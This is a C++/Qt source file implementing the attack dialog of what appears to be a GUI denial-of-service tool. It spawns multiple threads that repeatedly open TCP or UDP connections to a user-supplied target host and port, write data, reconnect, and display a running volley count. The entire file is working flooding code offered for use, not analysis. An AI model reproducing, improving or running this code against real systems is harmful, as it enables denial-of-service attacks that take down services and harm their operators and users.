#include <QMessageBox>
#include <QString>

#include "attack.h"
#include "ui_attack.h"

Attack::Attack(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Attack)
{
    ui->setupUi(this);
}

Attack::~Attack()
{
    delete ui;
}

QAbstractSocket *Attack::make_socket(QString host, QString port) {
    if(!running){
        return nullptr;
    }
    QAbstractSocket *sock;
    switch (protocol) {
    case TCP:{
        sock = new QTcpSocket(this);
        sock->connectToHost(host, port.toInt(), QTcpSocket::WriteOnly);
        break;
    }
    case UDP:{
        sock = new QUdpSocket(this);
        sock->connectToHost(host, port.toInt(), QUdpSocket::WriteOnly);
        break;
    }

    default:
        break;
    }
    if(sock->waitForConnected()){
        return sock;
    }else{
        return nullptr;
    }
}

void Attack::dos() {
    QAbstractSocket *sockets[connections];
    int x;
    for(x=0; x!= connections; x++){
        sockets[x] = nullptr;
    }

    while(true) {
        for(x=0; running && x != connections; x++) {
            if(sockets[x] == nullptr){
                sockets[x] = make_socket(target, port);
                continue;
            }
            sockets[x]->write("\0");
            if(sockets[x]->waitForBytesWritten()) {
                sockets[x]->disconnect();
                if(sockets[x]->waitForDisconnected(5)){
                    sockets[x]->close();
                    sockets[x] = make_socket(target, port);
                }
            }
            voly++;
        }
        voly++;
        if(!running){
            break;
        }else{
            QThread::usleep(20);
        }
    }
    for(int i = 0; i < connections; i++){
        if(sockets[i] != nullptr){
            sockets[i]->disconnect();
            if(sockets[i]->waitForDisconnected(5)){
                sockets[i]->close();
                delete sockets[i];
            }
        }
    }
}


void Attack::start(){
    for(int x = 0; running && x != threads; x++) {
        auto trd = QtConcurrent::run([=]{dos();});
        thread_list.append(trd);
    }
}

void Attack::stop(){
    running = false;
    for(auto thread : thread_list){
        thread.waitForFinished();
    }
    accept();
}

void Attack::on_pushButton_clicked()
{
    stop();
}

void Attack::set_config(QString t, QString p, int trds, int con){
    target = t;
    port = p;
    threads = trds;
    connections = con;
    ui->label_6->setText(target);
    ui->label_7->setText(port);
    ui->label_8->setText(QString::number(threads));
    ui->label_9->setText(QString::number(connections));
    ui->label_10->setText(QString::number(voly));
}

void Attack::update_gui(){
    while(running){
        QThread::usleep(20000);
        ui->label_10->setText(QString::number(voly));
    }
}

void Attack::showEvent(QShowEvent *event){
    QWidget::showEvent(event);
    QtConcurrent::run([=]{start();});
    QtConcurrent::run([=]{update_gui();});
    return;
}
